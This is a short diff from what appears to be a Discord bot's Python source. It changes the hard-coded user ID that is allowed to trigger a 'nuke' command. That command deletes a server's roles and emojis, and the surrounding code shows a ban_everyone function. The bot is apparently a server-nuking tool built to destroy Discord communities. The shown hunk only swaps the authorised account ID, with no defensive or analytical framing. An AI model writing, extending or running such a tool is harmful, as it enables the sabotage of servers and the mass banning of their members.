@@ -61,7 +61,7 @@ async def ban_everyone(ctx):
 
 @bot.command()
 async def nuke(ctx, ping: int, ban=None):
-    if ctx.author.id == 688530998920871969:
+    if ctx.author.id == 808420517282578482:
         await ctx.send("hehe nuke go brrrr")
         await del_roles(ctx)
         await del_emojis(ctx)
